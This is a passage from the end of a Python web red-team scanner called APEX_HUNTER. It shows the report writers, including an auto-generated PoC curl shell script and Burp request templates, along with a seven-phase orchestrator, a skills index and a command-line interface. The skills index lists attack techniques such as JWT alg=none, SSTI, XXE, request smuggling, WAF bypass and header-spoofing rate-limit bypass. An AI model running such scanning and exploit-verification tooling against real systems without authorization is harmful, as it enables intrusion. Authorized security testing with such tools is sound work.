    <b>PoC (curl):</b><pre><code>{html.escape(f.poc_curl)}</code></pre>
    <div class="fix">Fix: {html.escape(f.remediation)}</div>
  </div>
</div>"""
        infra = ""
        for p in profiles:
            infra += f"<tr><td>{p.host}</td><td>{p.ip}</td><td>{p.provider}</td><td>{p.tls_version}</td><td>{', '.join(p.waf) or 'None'}</td><td>{p.security_headers.get('score','?')}/100</td><td>{len(p.findings)}</td></tr>"
        stat_cards = "".join(
            f'<div class="stat"><div class="num" style="color:{self.SEV_COLOR.get(s,"#fff")}">{sev_counts.get(s,0)}</div>{s}</div>'
            for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"])
        stat_cards += f'<div class="stat"><div class="num" style="color:#58a6ff">{len(all_f)}</div>TOTAL</div>'
        filter_btns = "".join(
            "<button class=\"btn\" onclick=\"filter('" + s + "')\">" + s + "</button>"
            for s in ["ALL","CRITICAL","HIGH","MEDIUM","LOW","INFO"])
        html_out = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>APEX_HUNTER Report — {datetime.now().strftime('%Y-%m-%d')}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',monospace;font-size:14px}}
h1,h2{{color:#58a6ff}} h3{{color:#79c0ff;margin:12px 0 6px}}
.wrap{{max-width:1400px;margin:0 auto;padding:20px}}
.hdr{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:20px}}
.stats{{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}}
.stat{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 22px;text-align:center}}
.stat .num{{font-size:2em;font-weight:bold}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin:12px 0;overflow:hidden}}
.card-hdr{{padding:10px 14px;background:#1c2128;display:flex;align-items:center;gap:10px;flex-wrap:wrap}}
.card-body{{padding:14px}}
.badge{{padding:2px 8px;border-radius:4px;color:#fff;font-size:11px;font-weight:bold}}
pre{{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:4px;overflow-x:auto;margin:6px 0}}
code{{font-size:12px}}
.meta{{color:#8b949e;margin-bottom:8px}}
.fix{{background:#162032;border-left:3px solid #17a2b8;padding:6px;border-radius:2px;margin-top:8px}}
table{{width:100%;border-collapse:collapse;margin:12px 0}}
th{{background:#1c2128;padding:8px;text-align:left;border:1px solid #30363d;color:#79c0ff}}
td{{padding:8px;border:1px solid #30363d}}
.filters{{margin:12px 0}}
.btn{{padding:5px 12px;border-radius:4px;border:1px solid #30363d;background:#161b22;color:#c9d1d9;cursor:pointer;margin:2px}}
.btn:hover,.btn.active{{background:#58a6ff;color:#000}}
</style></head><body><div class="wrap">
<div class="hdr"><h1>&#x1F6E1; APEX_HUNTER v1.0 — Red Team Report</h1>
<p style="color:#8b949e;margin-top:8px">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp; 35 Tools &nbsp;|&nbsp; 45 Skills &nbsp;|&nbsp; Targets: {', '.join(p.host for p in profiles)}</p></div>
<div class="stats">{stat_cards}</div>
<h2>Infrastructure</h2>
<table><tr><th>Host</th><th>IP</th><th>Provider</th><th>TLS</th><th>WAF/CDN</th><th>Headers</th><th>Findings</th></tr>{infra}</table>
<h2>Findings ({len(all_f)})</h2>
<div class="filters">
{filter_btns}
</div>
<div id="fc">{cards}</div>
</div>
<script>
function filter(s){{
  document.querySelectorAll('.btn').forEach(b=>b.classList.remove('active'));
  event.target.classList.add('active');
  document.querySelectorAll('.card').forEach(c=>{{
    c.style.display=(s==='ALL'||c.dataset.sev===s)?'':'none';
  }});
}}
document.querySelector('.btn').classList.add('active');
</script></body></html>"""
        path.write_text(html_out)
        ok(f"  HTML  → {path}")

    def save_poc_script(self, profiles):
        path = self.out / f"poc_{self.ts}.sh"
        lines = ["#!/usr/bin/env bash","# APEX_HUNTER v1.0 — PoC Verification","# Run from authorized device with Saudi IP",""]
        for host, f in self._all_findings(profiles):
            lines += [f"","# [{f.severity}] {f.id}: {f.title} | {host}",
                      f"# CWE: {f.cwe} | CVSS: {f.cvss}", f.poc_curl,""]
        path.write_text("\n".join(lines))
        path.chmod(0o755)
        ok(f"  PoC   → {path}")

    def save_burp_templates(self, profiles):
        path = self.out / f"burp_requests_{self.ts}.txt"
        lines = ["# APEX_HUNTER — Burp Suite Request Templates",""]
        for host, f in self._all_findings(profiles):
            if f.burp_request:
                lines += [f"# {f.id}: {f.title}",f.burp_request,"","---",""]
        if len(lines) > 3:
            path.write_text("\n".join(lines))
            ok(f"  Burp  → {path}")

    def run(self, profiles):
        banner("Generating Reports")
        self.save_json(profiles); self.save_csv(profiles)
        self.save_markdown(profiles); self.save_html(profiles)
        self.save_poc_script(profiles); self.save_burp_templates(profiles)

# ══════════════════════════════════════════════════════════════
# ORCHESTRATOR — Auto-chain execution engine
# ══════════════════════════════════════════════════════════════
class APEXOrchestrator:
    PHASE_MAP = {
        1: "Passive OSINT (DNS, TLS, CT Logs, Wayback)",
        2: "WAF + Technology Fingerprinting",
        3: "Security Headers + CSP + CORS + Cookie",
        4: "JavaScript + Sourcemap + Secret Scanning",
        5: "API Mapping + GraphQL + Path Probing + S3",
        6: "Subdomain Takeover + SSRF + IDOR + XSS",
        7: "Advanced: Smuggling + JWT + OAuth + Host Injection + HPP + RateLimit + Cache + SSTI + XXE + ProtoPollu + GQL-Adv + DepConf + BizLogic + WebSocket + BOLA",
    }

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.reporter = APEXReporter(cfg.output)
        # Instantiate all 35 tools
        self.t01 = DNSResolver(); self.t02 = TLSAnalyzer()
        self.t03 = CTLogScanner(); self.t04 = WaybackMiner()
        self.t05 = WAFDetector(); self.t06 = TechFingerprinter()
        self.t07 = SecurityHeaderAuditor(); self.t08 = CSPAnalyzer()
        self.t09 = CORSAnalyzer(); self.t10 = CookieAuditor()
        self.t11 = JSExtractor(); self.t12 = SourcemapAnalyzer()
        self.t13 = SecretScanner(); self.t14 = APIMapper()
        self.t15 = GraphQLProber(); self.t16 = PathProber()
        self.t17 = S3BucketChecker(); self.t18 = SubdomainTakeoverDetector()
        self.t19 = SSRFDetector(); self.t20 = IDORMapper()
        self.t21 = HTTPSmugglingDetector(); self.t22 = JWTScanner()
        self.t23 = OAuthAnalyzer(); self.t24 = HostHeaderInjector()
        self.t25 = HTTPParameterPollution(); self.t26 = RateLimitBypassTester()
        self.t27 = CachePoisoningDetector(); self.t28 = SSTIScanner()
        self.t29 = XXEProber(); self.t30 = PrototypePollutionScanner()
        self.t31 = GraphQLAdvanced(); self.t32 = DependencyConfusionDetector()
        self.t33 = BusinessLogicProbe(); self.t34 = WebSocketTester()
        self.t35 = IDORDeepScanner()

    def _init_profile(self, url: str) -> TargetProfile:
        p = urlparse(url)
        host = p.hostname or url
        apex = ".".join(host.split(".")[-2:]) if host else host
        return TargetProfile(url=url, apex=apex, host=host, scheme=p.scheme)

    def _run_phase(self, n: int, p: TargetProfile) -> TargetProfile:
        banner(f"Phase {n}: {self.PHASE_MAP[n]}")
        cfg = self.cfg
        try:
            if n == 1:
                p = self.t01.run(p); p = self.t02.run(p)
                p = self.t03.run(p); p = self.t04.run(p)
            elif n == 2:
                p = self.t05.run(p, cfg); p = self.t06.run(p, cfg)
            elif n == 3:
                p = self.t07.run(p, cfg); p = self.t08.run(p, cfg)
                p = self.t09.run(p, cfg); p = self.t10.run(p, cfg)
            elif n == 4:
                p = self.t11.run(p, cfg); p = self.t12.run(p, cfg)
                p = self.t13.run(p, cfg)
            elif n == 5:
                p = self.t14.run(p, cfg); p = self.t15.run(p, cfg)
                p = self.t16.run(p, cfg); p = self.t17.run(p, cfg)
            elif n == 6:
                p = self.t18.run(p, cfg); p = self.t19.run(p, cfg)
                p = self.t20.run(p, cfg)
            elif n == 7:
                p = self.t21.run(p, cfg); p = self.t22.run(p, cfg)
                p = self.t23.run(p, cfg); p = self.t24.run(p, cfg)
                p = self.t25.run(p, cfg); p = self.t26.run(p, cfg)
                p = self.t27.run(p, cfg); p = self.t28.run(p, cfg)
                p = self.t29.run(p, cfg); p = self.t30.run(p, cfg)
                p = self.t31.run(p, cfg); p = self.t32.run(p, cfg)
                p = self.t33.run(p, cfg); p = self.t34.run(p, cfg)
                p = self.t35.run(p, cfg)
        except KeyboardInterrupt:
            warn("Interrupted — saving partial results...")
        except Exception as e:
            warn(f"Phase {n} error: {e}")
        return p

    def run(self) -> List[TargetProfile]:
        SEP = "═" * 70
        print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
        print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
        print(f"{C.WHITE}  35 Tools | 45 Skills | Auto-Chain Execution{C.NC}")
        print(f"{C.WHITE}{SEP}{C.NC}")
        print(f"  Targets : {', '.join(self.cfg.targets)}")
        print(f"  Output  : {self.cfg.output}")
        print(f"  Phases  : {self.cfg.phases}")
        print(f"  Workers : {self.cfg.workers} | Rate: {self.cfg.rate} r/s | Depth: {self.cfg.depth}")
        print(f"{C.WHITE}{SEP}{C.NC}\n")
        profiles = []
        for target in self.cfg.targets:
            banner(f"TARGET: {target}")
            profile = self._init_profile(target)
            for phase in sorted(self.cfg.phases):
                profile = self._run_phase(phase, profile)
                time.sleep(0.5 / self.cfg.rate)
            profiles.append(profile)
            # Per-target summary
            cnts = Counter(f.severity for f in profile.findings)
            banner(f"Summary — {profile.host}")
            for sev, col in [("CRITICAL",C.RED),("HIGH",C.RED),("MEDIUM",C.YELLOW),("LOW",C.CYAN),("INFO",C.DIM)]:
                if cnts.get(sev): print(f"  {col}{sev}: {cnts[sev]}{C.NC}")
        self.reporter.run(profiles)
        banner("Complete")
        ok(f"Total findings: {sum(len(p.findings) for p in profiles)} across {len(profiles)} target(s)")
        ok(f"Reports: {self.cfg.output}/")
        return profiles

# ══════════════════════════════════════════════════════════════
# SKILLS INDEX
# ══════════════════════════════════════════════════════════════
SKILLS_INDEX = """
APEX_HUNTER v1.0 — Skills Index (45 Skills / 35 Tools)
═══════════════════════════════════════════════════════
SKILL-01  DNS resolution & multi-record enumeration
SKILL-02  TLS version, cipher, certificate, SAN extraction
SKILL-03  Certificate Transparency log mining (crt.sh)
SKILL-04  Wayback Machine CDX API URL + parameter mining
SKILL-05  WAF/CDN fingerprinting (14 provider signatures)
SKILL-06  Technology stack detection (30 signatures)
SKILL-07  HTTP security header audit & scoring (10 headers / 100pts)
SKILL-08  CSP weakness analysis (8 patterns)
SKILL-09  CORS misconfiguration testing (6 origin bypass patterns)
SKILL-10  Cookie security attribute audit (Secure/HttpOnly/SameSite/__Host-)
SKILL-11  JavaScript file discovery + endpoint/parameter extraction
SKILL-12  Webpack sourcemap discovery + source file enumeration
SKILL-13  Secret/credential scanning with Shannon entropy (25 patterns)
SKILL-14  API endpoint discovery + Swagger/OpenAPI spec detection
SKILL-15  GraphQL introspection + schema extraction
SKILL-16  Sensitive file/directory enumeration (50+ paths)
SKILL-17  S3 bucket enumeration + public listing test
SKILL-18  Subdomain takeover detection (11 provider fingerprints)
SKILL-19  SSRF parameter identification + open redirect testing
SKILL-20  IDOR pattern mapping from historical URLs
SKILL-21  XSS injection surface identification (forms + inputs)
SKILL-22  ASN/hosting provider identification from IP CIDR ranges
SKILL-23  Wildcard DNS detection
SKILL-24  Googlebot WAF bypass testing
SKILL-25  Short-lived certificate (ACME/Let's Encrypt) detection
SKILL-26  Virtual host + subdomain live resolution
SKILL-27  Auto-chained PoC curl generation per finding
SKILL-28  CVSS v3.1 scoring + CWE/OWASP mapping
SKILL-29  Multi-format report export (JSON/HTML/Markdown/CSV)
SKILL-30  Burp Suite request template generation

NEW (Phase 7):
SKILL-31  HTTP Request Smuggling — CL.TE / TE.CL / TE.TE timing detection
SKILL-32  JWT vulnerability scanning — alg=none, weak secret, RS256→HS256
SKILL-33  OAuth 2.0 flow analysis — missing state, implicit flow, PKCE downgrade
SKILL-34  Host header injection — password reset poisoning + cache poisoning
SKILL-35  HTTP Parameter Pollution — duplicate params, array notation
SKILL-36  Rate limit bypass — X-Forwarded-For/X-Real-IP header spoofing
SKILL-37  Cache poisoning — unkeyed header injection + cache deception paths
SKILL-38  SSTI detection — {{7*7}} polyglot across Jinja2/Twig/Pebble/ERB
SKILL-39  XXE injection — OOB XXE, error-based file read, SVG vector, SOAP
SKILL-40  Prototype pollution — __proto__, constructor.prototype, URL + JSON
SKILL-41  GraphQL advanced attacks — batch aliases, introspection bypass
SKILL-42  Dependency confusion — internal package name leakage detection
SKILL-43  Business logic probe — negative price, overflow, coupon manipulation
SKILL-44  WebSocket security — CSWSH, ws:// downgrade, Origin bypass
SKILL-45  BOLA/IDOR deep scan — mass assignment, privilege escalation patterns
"""

# ══════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ══════════════════════════════════════════════════════════════
def main():
    p = argparse.ArgumentParser(
        description="APEX_HUNTER v1.0 — 35 Tools | 45 Skills | Auto-Chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python APEX_HUNTER.py --target https://example.com --output ./results
  python APEX_HUNTER.py --target https://t1.com --target https://t2.com --output ./out
  python APEX_HUNTER.py --target https://example.com --output ./out --phases 1,2,3,7
  python APEX_HUNTER.py --target https://example.com --output ./out --workers 15 --rate 3.0
  python APEX_HUNTER.py --skills
""")
    p.add_argument("--target","-t", action="append", default=[], dest="targets",
                   help="Target URL (repeatable for multiple targets)")
    p.add_argument("--output","-o", default="./apex_output", help="Output directory")
    p.add_argument("--workers",  type=int,   default=10,  help="Concurrent workers")
    p.add_argument("--rate",     type=float, default=2.0, help="Requests per second")
    p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
    p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
    p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
    p.add_argument("--phases",   default="1,2,3,4,5,6,7",
                   help="Phases to run (default: 1-7, e.g. 1,2,7)")
    p.add_argument("--skills",   action="store_true", help="Print skills index and exit")
    args = p.parse_args()

    if args.skills:
        print(SKILLS_INDEX); sys.exit(0)

    if not args.targets:
        p.print_help()
        print(f"\n{C.RED}Error: at least one --target required{C.NC}")
        sys.exit(1)

    try:
        phases = [int(x.strip()) for x in args.phases.split(",")]
    except ValueError:
        print(f"{C.RED}Error: --phases must be comma-separated integers{C.NC}"); sys.exit(1)

    cfg = Config(
        targets=args.targets, output=args.output,
        workers=args.workers, rate=args.rate, depth=args.depth,
        timeout=args.timeout, scope_extras=args.scope_extras, phases=phases)
    APEXOrchestrator(cfg).run()

if __name__ == "__main__":
    main()
